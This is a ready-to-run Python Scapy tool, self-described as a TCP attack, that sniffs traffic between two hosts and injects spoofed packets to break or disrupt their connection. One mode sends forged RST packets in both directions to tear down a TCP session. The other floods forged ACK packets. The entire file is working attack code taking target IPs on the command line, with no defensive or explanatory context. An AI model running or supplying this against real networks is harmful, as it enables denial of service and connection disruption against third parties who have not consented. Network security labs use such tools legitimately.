#!/usr/bin/env python
import argparse
import getopt
import sys

from scapy.all import *
from scapy.layers.inet import IP, TCP

def send_rst_pkts(dstip, srcip, dst_port, src_port, pkt):
    print("Sending rst pkts")

    ip1 = IP(src=dstip, dst=srcip)
    TCP_RST1 = TCP(sport=int(dst_port), dport=int(src_port), flags="R", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
    send(ip1 / TCP_RST1, verbose=False)

    ip2 = IP(src=srcip, dst=dstip)
    TCP_RST2 = TCP(sport=int(src_port), dport=int(dst_port), flags="R", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
    send(ip2 / TCP_RST2, verbose=False)
#


def send_ack_pkts(dstip, srcip, dst_port, src_port, pkt):

    ip1 = IP(src=dstip, dst=srcip)
    TCP_ACK1 = TCP(sport=int(dst_port), dport=int(src_port), flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)

    ip2 = IP(src=srcip, dst=dstip)
    TCP_ACK2 = TCP(sport=int(src_port), dport=int(dst_port), flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)

    send(ip1 / TCP_ACK1, count=3, verbose=False)
    send(ip2 / TCP_ACK2, count=3, verbose=False)
#


def launch_attack(dstip, srcip, dst_port: str, src_port: str, mode):
    ack_filter = 'src ' + dstip + ' and ' \
                 'dst ' + srcip + ' and ' \
                 'src port ' + dst_port + ' and ' \
                 'dst port ' + src_port + ' and ' \
                 'tcp[13] & 16!=0'

    if(mode == "rst-attack"):
        print("Dropping connection")
        t = sniff(filter=ack_filter, prn=lambda pkt: send_rst_pkts(dstip=dstip, srcip=srcip, dst_port=dst_port, src_port=src_port, pkt=pkt))
    elif(mode == "ack-attack"):
        print("ACK Flooding")
        t = sniff(filter=ack_filter, prn=lambda pkt: send_ack_pkts(dstip=dstip, srcip=srcip, dst_port=dst_port, src_port=src_port, pkt=pkt))
#


def syn_pkt_received(dstip, srcip, mode, pkt):
    dst_port = pkt[TCP].sport
    src_port = pkt[TCP].dport
    launch_attack(dstip, srcip, str(dst_port), str(src_port), mode)
#


def main(argv):
    dstip = ''
    srcip = ''
    mode = ''

    parser = argparse.ArgumentParser(description='Execute TCP attack')
    parser.add_argument('--d',
                        metavar='d',
                        type=str,
                        required=True,
                        help="Destination IP")

    parser.add_argument('--s',
                        metavar='s',
                        type=str,
                        required=True,
                        help="Source IP")

    parser.add_argument('--m',
                        metavar='m',
                        type=str,
                        required=True,
                        help="Attack mode: rst-attack or ack-attack")

    args = parser.parse_args()
    dstip = args.d
    srcip = args.s
    mode = args.m

    print('dstip is ' + dstip)
    print('srcip is ' + srcip)
    print('mode is ' + mode)
    print("Awaiting SYN packet")
    syn_filter = 'ip and src ' + dstip + ' and dst ' + srcip + ' and tcp[13] & 2!=0'
    sniff(count=1, filter=syn_filter, prn=lambda pkt: syn_pkt_received(dstip, srcip, mode, pkt))
#

if __name__ == "__main__":
    main(sys.argv[1:])
